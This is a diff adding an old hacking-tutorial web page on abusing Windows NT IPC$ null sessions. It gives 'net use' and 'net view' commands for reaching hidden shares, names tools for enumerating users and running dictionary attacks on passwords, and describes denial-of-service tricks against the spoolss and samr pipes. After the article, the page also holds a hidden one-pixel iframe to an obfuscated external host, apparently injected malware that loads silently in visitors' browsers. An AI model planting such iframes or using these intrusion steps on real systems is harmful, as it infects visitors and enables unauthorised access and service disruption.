@@ -1,0 +1,92 @@
+<html>
+<head>
+<title>Inter-Process Communication</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+</head>
+
+<body bgcolor="#000000" text="#ffffff" link="#ffffff" vlink="#ffffff">
+<table width="680" border="0" cellspacing="2" cellpadding="2" align="center">
+  <tr> 
+    <td width="693"> 
+      <pre>
+                        :::::::::   ::::::::  :::::::::  :::::::::: 
+                        :+:    :+: :+:    :+: :+:    :+: :+:        
+                        +:+    +:+ +:+        +:+    +:+ +:+        
+                        +#++:++#+  +#++:++#++ +#++:++#:  :#::+::#   
+                        +#+    +#+        +#+ +#+    +#+ +#+        
+                        #+#    #+# #+#    #+# #+#    #+# #+#        
+                        #########   ########  ###    ### ###  
+                         
+              	             <a href="http://blacksun.box.sk" target="_blank">http://blacksun.box.sk</a>
+                           _____________________________
+    ______________________I       <b>   Topic:</b>             I_____________________
+   \                      I                             I                    /
+    \     HTML by:        I <b>Inter-Process Communication</b> I   Written by:     /
+    >                     I           <b>(IPC)</b>             I                  < 
+   /      <a href="mailto:black_mesa@hacktik.org">Martin L.</a>       I_____________________________I   Mind Rift       \
+  /___________________________>                    <_________________________\</pre>
+    </td>
+  </tr>
+</table>
+<p>&nbsp;</p>
+<p>
+  This will explain the &quot;uses&quot; of IPC for hackers. Inter-Process Communication 
+  is used for data sharing between applications and computers. We will be looking 
+  at Windows NT default IPC$ share use for communication between computers. This 
+  share is what we use to start to gain access to the server. What we will look 
+  at before we start is the NET commands for the console in NT. (Note I was unable 
+  to create a null connection using a 95/98 computer I had to use an NT computer) 
+  The net commands that we will be using are net use and net view. Now get in 
+  to the console (fake ms-dos) in windows. Pick out your target and make sure 
+  that it is an NT system and it has port 139 open. You need port 139 open so 
+  that net-bios is on. After checking for that you go to the console and type: 
+</p>
+<blockquote> 
+  <p><br>
+    <br>
+    Example 1&gt; C:\&gt;NET USE \\TARGET\IPC$ * /USER:<br>
+    Example 2&gt; C:\&gt;NET USE \\TARGET\IPC$ * /USER:&quot;&quot;<br>
+    Example 3&gt; C:\&gt;NET USE \\TARGET\IPC$ &quot;&quot; /USER:&quot;&quot;</p>
+</blockquote>
+<ul>
+  <li>Note: For some reason the command varies a little bit from NT to NT</li>
+  <li>Note: TARGET is the name or IP of the computer, ex. \\211.3.4.11\ipc$ * 
+    /user:</li>
+  <li>Note: If it works youll get&gt; The command completed successfully.</li>
+  <li>Note: To check the connection type NET USE \\TARGET\IPC$ </li>
+</ul>
+<p>After starting a null connection you could try to access the hidden shares. 
+  The default hidden shares are: C$, PRINT$, ADMIN$, IPC$. As you can probably 
+  tell shares are hidden by putting a $ at the end of the share name. Sometime 
+  shares don't have passwords so you can use them. When you create a null connection 
+  you have the least possible rights. Next you could try using net view. To do 
+  this open the console and type:</p>
+<p>Example:</p>
+<p>C:\&gt;net view \\TARGET (Shares)<br>
+  Or<br>
+  C:\&gt;net view /workgroup:TARGETWG (Computers in workgroup)<br>
+  Or<br>
+  C:\&gt;net view /domain:TARGETD (Computers in domain)</p>
+<p>(Note: change TARGETWG to the name of the workgroup to see all of the computers 
+  connected)<br>
+  (Note: change TARGET to the IP or name of the computer to see all none hidden 
+  shares)<br>
+  (Note: change TARGETD to domain name example: /domain: Bob.com )<br>
+  If you can't find an open share you could use a program that I like a lot called 
+  winfo. Winfo will get all of the user names from the target. Or another programs 
+  that is Nat(NetBIOS Auditing Tool). Nat will try names and passwords (dictionary 
+  attack) to get the right one. Another well like program is sid2user and user2sid. 
+  <br>
+  Last but not least there are DoS attacks that could be preformed. Dos attacks 
+  become outdated quickly but new ones are always poping up. A good Dos attack 
+  that works on NT systems with printer capibiltes. It kinda goes like this (null 
+  connection is needed): \\target\pipe\spoolss. Do this alot. The next one is 
+  one that im not sure that works but you fill all the connections possible on: 
+  \\target\pipe\samr. For that I would recomend use a program like ubend.exe.<br>
+  <br>
+</p>
+<p></p>
+<p></p>
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</body>
+</html>
